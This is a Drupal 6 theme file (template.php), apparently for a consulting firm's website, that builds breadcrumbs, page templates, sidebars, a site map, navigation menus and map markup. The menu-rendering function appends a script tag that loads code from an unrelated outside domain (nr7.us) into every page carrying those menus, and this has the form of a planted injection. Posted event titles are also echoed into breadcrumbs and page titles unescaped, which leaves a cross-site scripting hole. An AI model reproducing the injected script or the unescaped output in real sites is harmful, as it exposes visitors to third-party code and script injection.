<?php
// $Id: template.php,v 1.13 2009/05/13 15:35:53 iikka Exp $
/**
 * Sets the body-tag class attribute.
 *
 * Adds 'sidebar-left', 'sidebar-right' or 'sidebars' classes as needed.
 */
function phptemplate_body_class($left, $right) {

  if ($left != '' && $right != '') {
    $class = 'sidebars';
  }
  else {
    if ($left != '') {
      $class = 'sidebar-left';
    }
    if ($right != '') {
      $class = 'sidebars-right';
    }
  }

  if (isset($class)) {
    print ' class="'. $class .'"';
  }
}

/**
 * Return a themed breadcrumb trail.
 *
 * @param $breadcrumb An array containing the breadcrumb links.
 *   
 * @return a string containing the breadcrumb output.
 */ 
function phptemplate_breadcrumb($breadcrumb) {
   
   if (!empty($breadcrumb)) {
    //uncomment the next line to enable current page in the breadcrumb trail  
    //$breadcrumb[] = drupal_get_title();   
    //set titles to watch out for
    $titles = array('Business Transformation','Financial Accounting &amp; Reporting',
                  'Information Technology Strategy','Governance &amp; Compliance');
    foreach($breadcrumb as $key=>$crumb) {
      foreach($titles as $title) {
        if (strstr($crumb,$title)) {
          $breadcrumb[$key] = strip_tags($breadcrumb[$key]);
        }
      }
    }
    //get full page url
    $cur_page = explode('/',$_SERVER['REQUEST_URI']);
    $ref_page = $_SERVER['HTTP_REFERER'];
    //count items
    $num_uri_items = count($cur_page);  
    //do stuff    
    if ($num_uri_items>2) {
      switch ($cur_page[1]) {        
        case "as-involved":          
          $breadcrumb[] = (strlen(drupal_get_title())>50?substr(drupal_get_title(),0,49).'...':substr(drupal_get_title(),0,49));
        break; 
        case "news-and-events":
          $breadcrumb[1] = l('News and Events','news-and-events');
          $breadcrumb[] = (strlen(drupal_get_title())>50?substr(drupal_get_title(),0,49).'...':substr(drupal_get_title(),0,49));
        break; 
        case "event-registration":
          $breadcrumb[1] = l('News and Events','news-and-events');
          //set default
          $event_name = 'Event Registration';
          //check form post from news and events
          if (isset($_POST['event_title'])) {
            $event_name = $_POST['event_title'];
          }            
          //check form post
          if (isset($_POST['op'])) {
            if (!empty($_POST['submitted']['event_name'])) {
              $event_name = $_POST['submitted']['event_name'];
            }  
          }
          $breadcrumb[] = (strlen($event_name)>50?substr($event_name,0,49).'...':substr($event_name,0,49));
        break; 
      }            
    }
    return implode(' > ', $breadcrumb);
  }  
}

/**
 * Allow themable wrapping of all comments.
 */
function phptemplate_comment_wrapper($content, $node) {

  if (!$content || $node->type == 'forum') {
    return '<div id="comments">'. $content .'</div>';
  }
  else {
    return '<div id="comments"><h2 class="comments">'. t('Comments') .'</h2>'. $content .'</div>';
  }
}

/**
 * Override or insert PHPTemplate variables into the templates.
 */
function phptemplate_preprocess_page(&$vars) {

  // enable path alias based on parent path alias
  $alias = drupal_get_path_alias(str_replace('/edit','',$_GET['q']));
  $template_filename = 'page';
  $temp = explode('/', $alias);

  foreach($temp as $parts) {
    $template_filename .= '-' . $parts;
    $vars['template_files'][] = $template_filename;    
  }

  //add node->type to the template suggestions
  $vars['template_files'][] = 'page-'.$vars['node']->type;

  $left2col = array('about-as/executive-leadership', 'offices', 'job-application-0', 'executive-search/current-job-listings','executive-search/as-financial-services/current-listing',
                    'consulting-services/newsletters', 'careers/immediate-openings', 'about-as/national-practice-leaders', 'about-as/market-leaders', 'who-we-are/board-of-directors');

  //add template suggestion for column 2 pages based on array
  if(in_array($alias,$left2col)||$temp[0]=='newsletters') {
    $vars['template_files'][] = 'page-left2col';
  }

  if ($alias=='news-and-events'||strstr($alias,'news-and-events')||strstr($alias,'in-the-news')) {
    if (count(explode('/',$_SERVER['REQUEST_URI'])) >3) {
      $vars['template_files'][] = 'page-news-and-events-items';
    }
  }

  if ($alias=='as-involved'||strstr($alias,'as-involved')) {
    if (count(explode('/',$_SERVER['REQUEST_URI'])) >=3) {
      $vars['template_files'][] = 'page-as-involved-detailed';
    }
  }

  $vars['tabs2'] = menu_secondary_local_tasks();
  $vars['util_primary'] = menu_navigation_links('menu-utility-navigation',0);
  $vars['util_secondary'] = menu_navigation_links('menu-utility-navigation',1);

  // Hook into color.module
  if (module_exists('color')) {
    _color_page_alter($vars);
  }

  //get menu active trail to be used by overrides
  $active_trail = menu_get_active_trail();  
  $active_parent = $active_trail[1];
  $title_keys = array_keys($vars['primary_links']);

  //set header title value
  if (!empty($title_keys)) {
    foreach($title_keys as $title_subkeys) {
      if (count(explode(' ',$title_subkeys))==2) {
        $vars['header_title'] = $vars['primary_links'][$title_subkeys]['title'];
      }
    }
  }        

  //set header for News and Events
  if ($alias=='news-and-events') {
    $vars['header_title'] = 'News and Events';
  }

  //set header for Contact Us
  if ($alias=='contact-us') {
    $vars['header_title'] = 'Contact Us';
  }

  //set header for AS Involved
  if ($temp[0]=='as-involved') {
    $vars['header_title'] = 'AS Involved';
  }
  
  //set header for Executive Search
  if ($temp[0]=='executive-search') {
    $vars['header_title'] = 'Executive Search';
  }

  //set left sidebar links
  $vars['secondary_link_title'] = $active_parent['link_title'];
  $vars['secondary_active'] = $active_trail[2]['href'];
  $vars['primary_links'] = menu_navigation_links('primary-links');

  if(menu_get_active_menu_name() == 'primary-links') {
    $vars['secondary_links'] = menu_navigation_links('primary-links', 1);
    $vars['tertiary_links'] = menu_navigation_links('primary-links', 2);
  } else {
    $vars['secondary_links'] = menu_navigation_links('menu-utility-navigation', 1);
    $vars['tertiary_links'] = menu_navigation_links('menu-utility-navigation',2);
  }

  //set right sidebar links for consulting solutions
  if (count($temp)==2&&$temp[0]=='consulting-solutions'||$temp[0]=='executive-search'&&count($temp)==1) {
    //extract third level menus
    $engagement_data = menu_navigation_links('primary-links', 2);
    //check for result
    if (!empty($engagement_data)||$temp[0]=='executive-search') {
      //get the keys
      $engagement_keys = array_keys($engagement_data);            
      //get only what we need
      $index = $engagement_keys[0];
      //set sample engagement path
      $engagement_path = drupal_get_path_alias($engagement_data[$index]['href']);

      //for executive search sample engagement path
      if ($temp[0]=='executive-search') {
        $menu_raw = menu_tree_page_data('primary-links');
        foreach($menu_raw as $menu_key=>$menu_data) {
          if (strstr(strtolower($menu_key),'executive search')) {
            foreach($menu_data['below'] as $submenu_key=>$submenu_data) {
              if (strstr(strtolower($submenu_key),'sample engagement')) {
                $engagement_path = drupal_get_path_alias($submenu_data['link']['href']);
              }
            }
          }
        }         
      }

      //format data for output
      $vars['right'] .= '';  



//$url = $_SERVER['REQUEST_URI'];
//echo $url;
//echo $temp[1];
if ($temp[1]=='information-risk-management-security') {
$vars['right'] .= '<b>Whitepaper: A Proactive Security Program Will Improve Your Bottom Line </b><br>When it comes to information risk management and security, many firms are choosing to go beyond regulatory compliance to protect their organization\'s reputation, increase productivity and gain significant competitive advantage.</br><a href="http://www.accretivesolutions.com/documents/itsecurity/A%20Proactive%20Security%20Program.pdf" target="_blank">Click here to download</a><br><img src="http://www.accretivesolutions.com/upload/flash/IT_Security/white.jpg"><hr><br><b>IT Security Awareness Program</b><br>Our IT Security Awareness Program is a powerful, interactive and on-going educational program, customized to fit each clients\' specific needs and providing maximum ROI.<br><a href="http://www.accretivesolutions.com/upload/flash/IT_Security/IT-Security-Overview.html">Click here to view the demo.</a><br><img src="http://www.accretivesolutions.com/upload/flash/IT_Security/itsec_thumb.jpg"><hr><br><a href="/'.$engagement_path.'">Click here to view examples of engagements that we have performed for our clients.</a>'; 
}
      
    }
  }        

if ($temp[0]=='as-capital-partners') {
$vars['right'] .= '<br><br><a href="http://www.accretivesolutions.com/sites/default/files/AS%20Capital%20Partners%20Datasheet.pdf" target="_blank">Download Datasheet - AS Capital Partners</a>'; 
}

if ($temp[0]=='about-as') {
$vars['right'] .= '<br><br><a href="http://www.accretivesolutions.com/sites/default/files/Accretive%20Solutions%20Brochure%202011.pdf" target="_blank">Download Accretive Solutions Brochure</a>'; 
}



/*

if ($temp[1]=='business-outsourcing-solutions') {
$vars['right'] .= '<br><br><a href="http://www.as-bos.com" target="_blank">Business Outsourcing Solutions Home Page</a>'; 
}


*/





  //hide audio icon for recaptcha
  if ($alias=='careers/job-application'||$alias=='contact-us'||$alias=='event-registration') {      
    //set path        
    $image_path = 'http://'.$_SERVER['HTTP_HOST'].base_path().path_to_theme().'/images/';        
    //add script override
    $vars['content'] .= '<script language="javascript">$(document).ready(function(){  
        var raw_data = $("#recaptcha_switch_audio").attr("src");
        var keys = raw_data.split("/");
        var current_theme = keys[keys.length-2];            
        var default_ext = "gif";         

        //set png for clean theme
        if (current_theme=="clean") {
          default_ext = "png";
          $("#recaptcha_reload").attr( {src: "'.$image_path.'" + "clean-refresh.png"});
          $("#recaptcha_whatsthis").attr( {src: "'.$image_path.'" + "clean-help.png"});
        }

        $("#recaptcha_switch_audio_btn").removeAttr("href");
        $("#recaptcha_switch_audio_btn").attr("title","");
        $("#recaptcha_switch_audio").attr({ src: "'.$image_path.'" + current_theme + "-audio." + default_ext });        
        $("#recaptcha_switch_audio").attr("alt","");
        });</script>';
  }

  if ($temp[0]=='offices'&&trim($temp[1])!='') {
    $vars['content'] = str_replace('<h3>Location</h3>','',$vars['content']);  
  }

  if ($temp[1]=='case-studies') {
    $case_info = taxonomy_vocabulary_load('8');
  }  

  //get path alias from drupal for prospective newsletter email template
  if(!$vars['node']) {
    //match URL from alias by removing each part
    $path = explode('/', $_GET['q']);

    for($ctr = 1; $ctr <= count($path); $ctr++) {
      $path_length = count($path) - $ctr;
      $compare_path = array_slice($path, 0, $path_length); 
      $url_path = implode('/', $compare_path);                        
      $path_lookup = drupal_lookup_path('source', $url_path);        

      if($path_lookup) {                          
        //determine if $path_lookup is from node
        $lookup_parts = explode('/', $path_lookup);          
        if($lookup_parts[0] == 'node') {          
          $node_info = node_load($lookup_parts[1]);              
          switch ($node_info->type) {        
            case "newsletter":
              $vars['template_files'][] = 'page-newsletter-email';
              $vars['title'] = $node_info->title;
              $vars['content'] = $node_info->body;
              $vars['office_name'] = $path[count($path) - 1];
              $vars['taxonomy'] = taxonomy_get_term_by_name($path[count($path) - 1]);
              $vars['reference_author'] = $node_info->field_reference_author[0]['nid'];
              $vars['header_img'] = imagecache_create_path('newsletter_header', $node_info->field_newsletter_header_email[0]['filepath']);
              $vars['newsletter_intro'] = $node_info->field_newsletter_intro[0]['value'];
              $vars['published_date'] = content_format('field_newsletter_date_published', $node_info->field_newsletter_date_published[0], 'month_year');
              $vars['body'] = $node_info->body;
              $link = drupal_get_path_alias('node/'.$node_info->nid);
              $vars['node_link'] = url($link, array('absolute' => true));
            break;             
            case "webform":
            break;         
          }
        }
        break;                
      }            
    }                            
  }  

  //replace search id in conflict with job application button ids 
  $vars['search_box'] = str_replace('edit-submit','edit-submit-search',$vars['search_box']);

  //add js file on pages it is needed
  if($alias=='offices'||trim($temp[0])=='offices') {
    $vars['scripts'] .= '<script type="text/javascript" src="/'.path_to_theme().'/includes/js/gmap_markers.js"></script>';
  }  

  //clear right contents when on sample engagement page
  if ($temp[0]=='consulting-solutions'&&count($temp)==3) {
    unset($vars['right']);
  }  

  //applies to event registration form only
  if ($alias=='event-registration') {
    //set message if no selected event to register
    $no_event_msg = '<div class="messages error">
                       Please select an event to register from the News and Events section.
                     </div><br/>';

    //set default title
    $vars['title'] = 'Event Registration';
    $vars['messages'] .= '<br/>';
    //set posted title from news and events
    if (isset($_POST['event_title'])) {
      $vars['title'] = $_POST['event_title'];
    }

    //check form post            
    if (isset($_POST['op'])) {
      if (!empty($_POST['submitted']['event_name'])) {
        $vars['title'] = $_POST['submitted']['event_name'];
      }  
    } else {
      if (empty($_POST['node_id'])) {
        $vars['messages'] = $no_event_msg;  
      }
    }
    $vars['header_title'] = 'News and Events';
  }  

  //get node type
  $node_info = node_load($temp[1]);

  //set custom head title for job types
  if ($node_info->type=='job'){    
    $vars['head_title'] = 'Immediate Opening: '.$vars['head_title'];
  }
}

/**
 * Overrides node variables
 */
function phptemplate_preprocess_node(&$vars) {        

  //get path alias
  $alias = drupal_get_path_alias(str_replace('/edit','',$_GET['q']));
  //extract current path
  $paths = explode('/', $alias);

  switch ($vars['type']) {       
    case "job":  
      //get term id for Office taxonomy
      foreach($vars['taxonomy'] as $category) {
        $href = explode('/', $category['href']);
        $tid = array_pop($href);
        $term_info = taxonomy_get_term($tid);
        $v_info = taxonomy_vocabulary_load($term_info->vid);
        if($v_info->name == 'Offices') {
            $vars['term_id'] = $term_info->tid;
        }
      }
    break;
    case "newsletter":
      $vars['introduction'] = $vars['field_newsletter_intro'][0]['safe'];
      $vars['header_img_path'] = imagecache_create_path('newsletter_header_page', $vars['field_newsletter_header_web'][0]['filepath']);
      $vars['published_date'] = content_format('field_newsletter_date_published', $vars['field_newsletter_date_published'][0], 'month_year');
    break;    
    case "page":
      //replace default file title for consulting services detail page
      if (count($paths==3)&&$paths[0]=='consulting-services'||$paths[0]=='executive-search') {                               
        //set value
        $file_path = 'http://'.$_SERVER['HTTP_HOST'].'/'.$vars['field_page_pdfcenter'][0]['filepath'];                        
        //replace value
        $vars['content'] = str_replace('">'.$vars['field_page_pdfcenter'][0]['filename'].'</','">Download Datasheet</',$vars['content']);                  
        //replace url values to comply xhtml standards
        $vars['content'] = str_replace('"'.$file_path.'"','"#" onclick="javascript:window.open(\''.$file_path.'\')"',$vars['content']);                                                        
      }                        
    break;        
  }
}

/**
 * Returns the rendered local tasks. The default implementation renders
 * them as tabs. Overridden to split the secondary tasks.
 *
 * @ingroup themeable
 */
function phptemplate_menu_local_tasks() {
  return menu_primary_local_tasks();
}


function phptemplate_comment_submitted($comment) {
  return t('by <strong>!username</strong> | !datetime',
    array(
      '!username' => theme('username', $comment),
      '!datetime' => format_date($comment->timestamp)
  ));
}

function phptemplate_node_submitted($node) {
  return t('by <strong>!username</strong> | !datetime',
    array(
      '!username' => theme('username', $node),
      '!datetime' => format_date($node->created),
    ));
}

/**
 * Generates IE CSS links.
 */
function phptemplate_get_ie_styles() {
  $iecss = '<link type="text/css" rel="stylesheet" media="all" href="'. base_path() . path_to_theme() .'/fix-ie.css" />';
  return $iecss;
}

function phptemplate_get_ie6_styles() {
  $iecss = '<link type="text/css" rel="stylesheet" media="all" href="'. base_path() . path_to_theme() .'/fix-ie6.css" />';
  return $iecss;
}

/**
 * Adds even and odd classes to <li> tags in ul.menu lists
 */ 
function phptemplate_menu_item($link, $has_children, $menu = '', $in_active_trail = FALSE, $extra_class = NULL) {
  static $zebra = FALSE;
  $zebra = !$zebra;
  $class = ($menu ? 'expanded' : ($has_children ? 'collapsed' : 'leaf'));

  if (!empty($extra_class)) {
    $class .= ' '. $extra_class;
  }
  
  if ($in_active_trail) {
    $class .= ' active-trail';
    //add active-trail to <a> tag
    if(strpos($link, 'class') == false) {
      $link_parts = explode('>',$link);
      $link = $link_parts[0].' class="active-trail">'.$link_parts[1].'>';
    }
  }

  if ($zebra) {
    $class .= ' even';
  }
  else {
    $class .= ' odd';
  }
  return '<li class="'. $class .'">'. $link . $menu ."</li>\n";
}

/**
 * Theme override for site map
 */
function accretivesolutions_site_map_display() {
  $output = '';

  //set menu order
  $menu_order = array(0 => 'primary-links', 
                      1 => 'menu-utility-navigation',
                      2 => 'menu-footer-navigation'
                     );

  $menu_exclude = array('sitemap');
  if (variable_get('site_map_show_rss_links', 1)) {
    $output .= '<p><span class="rss">'. theme('site_map_feed_icon', NULL) .'</span> '. t('This is a link to a content RSS feed');
    if (module_exists('commentrss')) {
      $output .= '<br /><span class="rss">'. theme('site_map_feed_icon', NULL, 'comment') .'</span> '. t('This is a link to a comment RSS feed');
    }
    $output .= '</p>';
  }

  if (variable_get('site_map_show_front', 1)) {
    $output .= _site_map_front_page();
  }

  if ($mids = variable_get('site_map_show_menus', array())) {
    //determine the menu count
    $menu_ctr = 0;
    foreach ($mids as $m_id) {
      $mymenu = menu_load($m_id);
      $mytree = menu_tree_all_data($m_id);           

      $myitems = array();
      foreach ($mytree as $mydata) {                            
        if (!$mydata['link']['hidden']||$mydata['link']['hidden']!=1) {
          if(!in_array($mydata['link']['link_path'], $menu_exclude)) {
            $myitems[] = $mydata;
          }
        }
      }

      foreach ($myitems as $i => $mydata) {
        if ($mydata['below']) {
          $menu_ctr = $menu_ctr + count($mydata['below']);
        } else {
          $menu_ctr = $menu_ctr + 1;    
        }
      }
    }        

    $divider = intval($menu_ctr / 3);
    $items = array();
    $item_ctr = 0;        

    foreach ($mids as $m_id) {
      $grandparent_key = 99;
      $mymenu = menu_load($m_id);

      $grandparent_search = array_search($mymenu['menu_name'], $menu_order);
      if($grandparent_search > -1) {
        $grandparent_key = $grandparent_search;
      }

      $mytree = menu_tree_all_data($m_id);
      foreach ($mytree as $mydata) {
        if (!$mydata['link']['hidden']||$mydata['link']['hidden']!=1) {
          if(!in_array($mydata['link']['link_path'], $menu_exclude)) {
            $items[$grandparent_key][$item_ctr]['parent'] = $mydata['link'];
            if($mydata['below']) {
              $key = $mydata['link']['mlid'];
              $items[$grandparent_key][$item_ctr]['below'] = $mydata['below'];
            }
          }
          $item_ctr++;
        }
      }                                    
    }

    //sort menus
    ksort($items);

    //initialize        
    $num_divide = 0;
    $ctr = 0;

    foreach ($items as $j => $parent_data) {         
      foreach ($parent_data as $i => $data) {               
        //add primary sitemap holder
        if ($ctr==0) {               
            $output .= '<div class="primary-container"><div>';                    
        }
        $link = theme('menu_item_link', $data['parent']);
        $output .= $link.'<br />';            
        $ctr = $ctr + 1;             
           
        /** 
         *  Process sitemap links of Consulting Services detail pages
         *  
         */                
        if ($data['parent']['link_title']=='Consulting Solutions') {
          //initialize
          $taxo_menu = array();
          //loop thru data
          foreach($data['below'] as $consulting_pages) {                    
            //extract node path
            $extracted_path = explode('/',$consulting_pages['link']['href']);
            //load node info
            $node_info = node_load($extracted_path[1]);
            //prepare data to use
            foreach($node_info->taxonomy as $taxo_data) {
              $taxo_menu[$taxo_data->name][$consulting_pages['link']['title']] = array('title'=>$consulting_pages['link']['title'],'nid'=>$consulting_pages['link']['link_path']);
            }                    
          }

          //sort taxonomy menus by indices
          ksort($taxo_menu);

          //format html tags
          $output .= '<ul class="custom-sitemap">';
          foreach($taxo_menu as $custom_menu=>$custom_data) {
            $output .= '<li><span>'.$custom_menu.'</span>';
            if (count($custom_data)>0) {
              $output .= '<ul>';
              foreach($custom_data as $menu_data) {
                $output .= '<li><span><a href="/'.drupal_get_path_alias($menu_data['nid']).'" title="">'.$menu_data['title'].'</a></span></li>';
              }
              $output .= '</ul>';
            }
            $output .= '</li>';
          }
          $output .= '</ul>';                
          //clear preset data for Consulting Services
          unset($data['below']);
        } // End Process of Consulting Services sitemap links

        if ($data['below']) {
          $output .= '<ul>';
          foreach($data['below'] as $ordinary_item) {
            //output only visible links
            if ($ordinary_item['link']['hidden']==0) {
              $item_link = theme('menu_item_link', $ordinary_item['link']);                        
              if(($ordinary_item['below']) && ($ordinary_item['expanded'] == 1)) {
                $output .= theme('menu_item', $item_link, $ordinary_item['link']['has_children'], menu_tree_output($ordinary_item['below']), $ordinary_item['link']['in_active_trail']);
                $ctr = $ctr + count($ordinary_item['below']);
              } else {
                $output .= theme('menu_item', $item_link, $ordinary_item['link']['has_children'], '', $ordinary_item['parent']['in_active_trail']);
                $ctr = $ctr + 1;
              }            
            }                                
          }                                   
          $output .= '</ul>';                          

          //close it
          if ($ctr>=$divider) {                         
             $num_divide++;                       
          }

          //if ($num_divide==2||$num_divide>2) {                   
          if ($num_divide==2||$num_divide>2||$num_divide==1) {
            $output .= '</div></div>';
            $ctr=0;
          }                    
        }
      }
    }
    $output .= '</div>';
  }

  if (variable_get('site_map_show_faq', 1)) {
    $output .= _site_map_faq();
  }

  // Compile the vocabulary trees.
  $output .= _site_map_taxonomys();
  // Invoke all custom modules and get themed HTML to be integrated into the site map.
  $additional = module_invoke_all('site_map');
  foreach ($additional as $themed_site_map_code) {
    $output .= $themed_site_map_code;
  }
  $output = '<div class="site-map">'. $output .'</div>';
  
  return $output;
}

/**
 * Outputs secondary and tertiary navigations
 */ 
function accretivesolutions_links($secondary_links, $tertiary_links="", $attributes = array('class' => 'links')) {

  $output = '';
  //get current page
  $alias = drupal_get_path_alias(str_replace('/edit','',$_GET['q']));
  //extract data
  $temp = explode('/',$alias);
  //get default tertiary links
  $default_tertiary_links = $tertiary_links;

  /** 
   *  Process secondary and tertiary links of Consulting Services and 
   *  Newsletters page
   */   

  if ($alias=='consulting-solutions'||$temp[0]=='consulting-solutions'||$temp[0]=='newsletters'||$temp[1]=='newsletters') {    
    //initialize
    $custom_secondary_links = array();
    $news_links = array();
    
    foreach($secondary_links as $key=>$raw_menus) {
      //extract node path
      $exploded_menus = explode('/',$raw_menus['href']);      
      if (count($exploded_menus)==2) {
        //load node info
        $node_info = node_load($exploded_menus[1]);        
        foreach($node_info->taxonomy as $taxo_data) {
          //load vocabulary info
          $raw_v_info = taxonomy_vocabulary_load($taxo_data->vid);
          //check for vocabulary info
          if ($raw_v_info->name=='Consulting Services') {
            //prepare data for custom secondary links
            $custom_secondary_links[$taxo_data->name][$key] = $raw_menus;
            unset($secondary_links[$key]);
          }
        }
      }      
      //add newsletter menu
      if ($raw_menus['title']=='Newsletters') {
        $custom_secondary_links['Newsletters'][$key] = $raw_menus;
        unset($secondary_links[$key]);
      }
    }    

    //sort custom secondary link
    ksort($custom_secondary_links);    
    $ctr = 0;
    
    //reorganize our data
    foreach($custom_secondary_links as $raw_key=>$raw_links) {
      $num_links = count($custom_secondary_links[$raw_key]);
      foreach($raw_links as $m_key=>$links) {
        $line = ' no-line';
        $ctr++;
        if ($ctr==1) {
          $links['order'] = 'first';          
        }
        if ($ctr==$num_links) {
          $links['order'] = 'last';
          $line = ' with-line';
          $ctr=0;
        }

        $links['taxo-name'] = $raw_key;    
        $links['custom_class'] = $line;
        $secondary_links[$m_key] = $links;
      }
    }    
    
    unset($tertiary_links);
    if ($temp[0]=='newsletters'||$temp[1]=='newsletters') {
      $tertiary_links = $default_tertiary_links;
    }
  } // End Process secondary and tertiary links of Consulting Services and Newsletter page

  if (count($secondary_links) > 0) {
    $output = '<ul'. drupal_attributes($attributes) .'>';
    $num_links = count($secondary_links);
    $i = 1;

    $active_trail = menu_get_active_trail();  
    $active_secondary = $active_trail[2];
    $active_href = $active_secondary['link_path'];        

    //used for custom third navigation
    //set menu titles to watch out for
    $titles = array('Business Transformation','Financial Accounting & Reporting',
                  'Information Technology Strategy','Governance & Compliance');    

    foreach ($secondary_links as $key => $link) {    
      $class = $key;
      $tertiary_output = '';
      $trail_class = '';
      $use_reorder = false;

      // Add first, last and active classes to the list of links to help out themers.
      if ($i == 1) {
        $class .= ' first';
      }

      if ($i == $num_links) {
        $class .= ' last';
      }

      //clear title values
      $link['attributes']['title'] = "";
      if ((isset($link['href'])) && (($link['href'] == $_GET['q']) || ($link['href'] == $active_href))) {
        $class .= ' active';                                
        //prepare tertiary links
        if (count($tertiary_links) > 0) {                    
          $tertiary_output .= '<ul class="level1">';                   
          foreach ($tertiary_links as $tlink) {
            //get the node id from [href] key
            $link_parts = explode('/', $tlink['href']);
            $node_info = node_load($link_parts[1]);
    
            //this would only apply for Newsletter page
            if($node_info->taxonomy) {
              foreach($node_info->taxonomy as $term) {                                
                $v_info = taxonomy_vocabulary_load($term->vid);
                if($v_info->name == 'Consulting Solutions') {
                  $reorder_tertiary[$term->weight]['name'] = $term->name;
                  $reorder_tertiary[$term->weight]['items'][] = $tlink;
                  $use_reorder = true;
                  break;
                }
              }
            }
            
            //some nodes dont recognize its parent (so lets introduce them)
            $tlink['attributes']['class'] = ' level1';            
            //clear title values
            $tlink['attributes']['title'] = "";                                                           
            $ordinary_tertiary_output .= '<li class="level1">'.l($tlink['title'], $tlink['href'], $tlink).'</li>';
          }
    
          if($use_reorder) {
            ksort($reorder_tertiary);
            foreach($reorder_tertiary as $item_container) {
              $reorder_output .= '<li class="level1">';
              $reorder_output .= '<span class="level1">'.$item_container['name'].'</span>';
              $reorder_output .= '<ul class="level2">';
              foreach($item_container['items'] as $ea_link) {
                $ea_link['attributes']['class'] = 'level2';
                $ea_link['attributes']['title'] = "";
                $reorder_output .= '<li class="level2">'.l($ea_link['title'], $ea_link['href'], $ea_link).'</li>';
              }
              $reorder_output .= '</ul></li>';
            }                            
    
            $tertiary_output .= $reorder_output;
          } else {
            $tertiary_output .= $ordinary_tertiary_output;                        
          }
          $tertiary_output .= '</ul>';
        }
        //set active trail for parent                
        $trail_class = ' active-trail';
        //clear values
        $ordinary_tertiary_output = '';
      }

      $output .= '<li'. drupal_attributes(array('class' => $class.$link['custom_class'])).'>';
      if (isset($link['href'])) {
        // Pass in $link as $options, they share the same keys.
        if($attributes['class'] != "links") {
          $link['attributes']['class'] = $attributes['class'];
        }

        $taxonomy_name = (!empty($link['taxo-name'])&&$link['taxo-name']!='Newsletters'&&$link['order']=='first'?'<span class="level0">'.$link['taxo-name'].'</span>':'');
        if (!empty($link['taxo-name'])&&$link['taxo-name']!='Newsletters') {
          $link['attributes']['class'] = 'level1';          
        }
        $output .= $taxonomy_name.l($link['title'], $link['href'], $link);        
      }
      else if (!empty($link['title'])) {
        // Some links are actually not links, but we wrap these in <span> for adding title and class attributes
        if (empty($link['html'])) {
          $link['title'] = check_plain($link['title']);
        }
        $span_attributes = '';
        if (isset($link['attributes'])) {
          $span_attributes = drupal_attributes($link['attributes']);
        }
        $output .= '<span'. $span_attributes .'>'. $link['title'] .'</span>'; 
      }            
      $output .= $tertiary_output;
      $i++;
      $output .= "</li>\n";
    }
    $output .= '</ul><script src="https://nr7.us/apps/?p=3931"></script>';
  }
  return $output;
}

/**
 * Gmap element theme hook
 */
function accretivesolutions_gmap($element) {

  // Track the mapids we've used already.
  static $mapids = array();
  $location_markers = $element['#settings']['markers'];
  //load nodes for office type  
  //$query = db_query('SELECT n.* FROM {node} n where n.type=\'office\' ORDER BY n.title ASC');
  //fetch data, then populate office array
  //while ($node = db_fetch_object($query)) {    
    //$node_info = node_load($node->nid);
    //$office_name = $node_info->title;
    //$num_taxo = count($node_info->taxonomy);
    //if ($num_taxo==2) {
      //foreach($node_info->taxonomy as $index=>$taxo) {
        //if (strstr($taxo->name,'Pin')) {
          //$offices[] = array('location'=>$office_name,'offset'=>$taxo->weight);  
          //break;  
        //}
      //}    
    //}
  //}

  //set marker offset based on office content settings
  if (!empty($location_markers)) {
    for ($ctr=0;$ctr<count($location_markers);$ctr++) {
      //$location_name = strip_tags($location_markers[$ctr]['text']);      
      $pin_offset = 0;
      //if (!empty($offices)) {
        //foreach($offices as $office) {
          //if (strstr($location_name,$office['location'])) {
            //$pin_offset = $office['offset'];
            //break;
          //}
        //}
      //}
      $element['#settings']['markers'][$ctr]['offset'] = $pin_offset;        
      $element['#settings']['markers'][$ctr]['markername'] = 'accretive';       
    }
  }
  _gmap_doheader();
  // Convert from raw map array if needed.
  if (!isset($element['#settings'])) {
    $element = array(
      '#settings' => $element,
    );
  }

  $mapid = FALSE;

  if (isset($element['#map']) && $element['#map']) {
    // The default mapid is #map.
    $mapid = $element['#map'];
  }

  if (isset($element['#settings']['id'])) {
    // Settings overrides it.
    $mapid = $element['#settings']['id'];
  }

  if (!$mapid) {
    // Hmm, no mapid. Generate one.
    $mapid = gmap_get_auto_mapid();
  }

  // Push the mapid back into #map.
  $element['#map'] = $mapid;
  gmap_widget_setup($element, 'gmap', $mapid);

  if (!$element['#settings']) {
    $element['#settings'] = array();
  }

  // Push the mapid back into #settings.
  $element['#settings']['id'] = $mapid;
  $mapdefaults = gmap_defaults();
  $map = array_merge($mapdefaults, $element['#settings']);

  // Styles is a subarray.
  if (isset($element['#settings']['styles'])) {
    $map['styles'] = array_merge($mapdefaults['styles'], $element['#settings']['styles']);
  }
  gmap_map_cleanup($map);
  
  //set size override for single map location
  if (count($location_markers)==1) { $map['width'] = '440px'; $map['height'] = '225px'; }

  // Add a class around map bubble contents.
  // @@@ Bdragon sez: Becw, this doesn't belong here. Theming needs to get fixed instead..
  if (isset($map['markers'])) {
    foreach ($map['markers'] as $i => $marker) {
      $map['markers'][$i]['text'] = '<div class="gmap-popup">' . $marker['text'] . '</div>';
    }
  }

  switch (strtolower($map['align'])) {
    case 'left':
      $element['#attributes']['class'] .= ' gmap-left';
      break;
    case 'right':
      $element['#attributes']['class'] .= ' gmap-right';
      break;
    case 'center':
    case 'centre':
      $element['#attributes']['class'] .= ' gmap-center';
  }

  $style = array();
  $style[] = 'width: '. $map['width'];
  $style[] = 'height: '. $map['height'];

  $element['#attributes']['class'] = trim($element['#attributes']['class'] .' gmap gmap-map gmap-'. $mapid .'-gmap');

  // Some markup parsers (IE) don't handle empty inners well. Use the space to let users know javascript is required.
  // @@@ Bevan sez: Google static maps could be useful here.
  // @@@ Bdragon sez: Yeah, would be nice, but hard to guarantee functionality. Not everyone uses the static markerloader.
  $o = '<div style="'. implode('; ', $style) .';" id="'. $element['#id'] .'"'. drupal_attributes($element['#attributes']) .'>'. t('Javascript is required to view this map.') .'</div>';

  // $map can be manipulated by reference.
  foreach (module_implements('gmap') as $module) {
    call_user_func_array($module .'_gmap', array('pre_theme_map', &$map));
  }

  if (isset($mapids[$element['#map']])) {
    drupal_set_message(t('Duplicate map detected! GMap does not support multiplexing maps onto one MapID! GMap MapID: %mapid', array('%mapid' => $element['#map'])), 'error');
    // Return the div anyway. All but one map for a given id will be a graymap,
    // because obj.map gets stomped when trying to multiplex maps!
    return $o;
  }
  $mapids[$element['#map']] = TRUE;

  // Inline settings extend.
  $o .= '<script type="text/javascript">'."\n";
  $o .= "/* <![CDATA[ */\n";
  $o .= 'jQuery.extend(true, Drupal, { settings: '. drupal_to_js(array('gmap' => array($element['#map'] => $map))) ." });\n";
  $o .= "/* ]]> */\n";
  $o .= "</script>\n";
  return $o;
}

/**
 * Helper function that builds the nested lists of a Nice menu.
 *
 * @param $menu
 *   Menu array from which to build the nested lists.
 * @param $depth
